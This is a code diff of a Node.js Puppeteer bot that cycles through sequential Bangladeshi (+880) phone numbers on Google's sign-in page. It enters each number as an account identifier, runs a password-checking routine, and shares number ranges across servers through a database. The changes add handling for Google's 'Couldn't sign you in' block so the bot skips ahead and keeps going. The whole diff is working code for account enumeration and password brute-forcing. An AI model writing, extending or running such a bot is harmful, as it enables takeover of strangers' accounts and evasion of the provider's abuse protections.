@@ -35,7 +35,7 @@ module.exports = class {
 
             if(((this.now-update) > 60 && mLoadSuccess) || (mNumber == mPrevNumber && mLoadSuccess)) {
                 console.log('---Restart Browser---')
-                request.get({ url: 'xxx' }, function (error, response, body) { })
+                //request.get({ url: 'xxx' }, function (error, response, body) { })
             }
 
             if(mLoadSuccess) {
@@ -62,7 +62,6 @@ module.exports = class {
                         } else {
                             this.mSirial = parseInt(value['start_'+this.SIZE])
                             mNumber = parseInt(value['runing_'+this.SIZE])
-                            //mNumber = 1748008229
                         }
                         
                         console.log('+880'+mNumber)
@@ -91,7 +90,6 @@ module.exports = class {
             
             this.page.on('request', async request => {
                 const url = request.url
-                //console.log(url)
                 update = parseInt(new Date().getTime() / 1000)
                 if(url.startsWith('https://fonts.gstatic.com/s/') || url.startsWith('https://accounts.google.com/_/kids/signup/eligible') || url.startsWith('https://accounts.google.com/generate')) {
                     request.abort()
@@ -110,41 +108,56 @@ module.exports = class {
                         }
                     })
 
-                    if(!this.page.url().startsWith('https://accounts.google.com/ServiceLogin?')) {
-                        console.log('2: '+this.page.url())
-                    }
-    
-                    if(output) {
+                    const block = await this.page.evaluate(() => {
+                        let root = document.querySelector('#headingText')
+                        if(root && root.innerText.includes(`Couldn’t sign you in`)) {
+                            return true
+                        } else {
+                            return false
+                        }
+                    })
+
+                    if(block) {
                         mNumber++
                         this.mLoad++
-                        if(parseInt(this.mSirial)+1 <= parseInt(mNumber/1000000)) {
-                            this.database.child('sirial').once('value', (snapshot) => {
-                                const value = snapshot.val()
-                                if(value != null) {
-                                    this.mSirial = parseInt(value[this.SIRIAL])
-                                    mNumber = parseInt(this.SIRIAL+this.mSirial+'000000')
-                                    this.database.child('sirial').child(this.SIRIAL).set(this.mSirial+1)
-                                    this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
-                                    this.database.child('server').child(this.SERVER).child('start_'+this.SIZE).set(parseInt(this.SIRIAL+this.mSirial))
-                                    if(this.mLoad % 10 == 0) {
-                                        console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- Null')
+                        this.mPasswordTry = 0
+                        this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                        this.page.goBack()
+                    } else {
+                        if(output) {
+                            mNumber++
+                            this.mLoad++
+                            if(parseInt(this.mSirial)+1 <= parseInt(mNumber/1000000)) {
+                                this.database.child('sirial').once('value', (snapshot) => {
+                                    const value = snapshot.val()
+                                    if(value != null) {
+                                        this.mSirial = parseInt(value[this.SIRIAL])
+                                        mNumber = parseInt(this.SIRIAL+this.mSirial+'000000')
+                                        this.database.child('sirial').child(this.SIRIAL).set(this.mSirial+1)
                                         this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                                        this.database.child('server').child(this.SERVER).child('start_'+this.SIZE).set(parseInt(this.SIRIAL+this.mSirial))
+                                        if(this.mLoad % 10 == 0) {
+                                            console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- Null')
+                                            this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                                        }
+                                        ;(async () => {
+                                            await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
+                                            await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
+                                        })()
                                     }
-                                    ;(async () => {
-                                        await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
-                                        await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
-                                    })()
+                                })
+                            } else {
+                                if(this.mLoad % 10 == 0) {
+                                    console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- Null')
+                                    this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
                                 }
-                            })
-                        } else {
-                            if(this.mLoad % 10 == 0) {
-                                console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- Null')
-                                this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                                await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
+                                await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
                             }
-                            await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
-                            await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
                         }
                     }
+    
+                    
                 } else if(url.startsWith('https://accounts.google.com/generate') && mLoadSuccess) {
                     const output = await this.page.evaluate(() => {
                         let root = document.querySelector('#identifierNext')
@@ -157,15 +170,28 @@ module.exports = class {
     
                     this.mCapture = false
 
-                    if(!this.page.url().startsWith('https://accounts.google.com/ServiceLogin?')) {
-                        console.log('1: '+this.page.url())
-                    }
-    
-                    if(output) {
-                        await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
-                        await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
+                    const block = await this.page.evaluate(() => {
+                        let root = document.querySelector('#headingText')
+                        if(root && root.innerText.includes(`Couldn’t sign you in`)) {
+                            return true
+                        } else {
+                            return false
+                        }
+                    })
+
+                    if(block) {
+                        mNumber++
+                        this.mLoad++
+                        this.mPasswordTry = 0
+                        this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                        this.page.goBack()
                     } else {
-                        await this.checkPassword()
+                        if(output) {
+                            await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
+                            await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
+                        } else {
+                            await this.checkPassword()
+                        }
                     }
                 } else if(url.startsWith('https://accounts.google.com/_/signin/challenge')) {
                     await this.delay(2000)
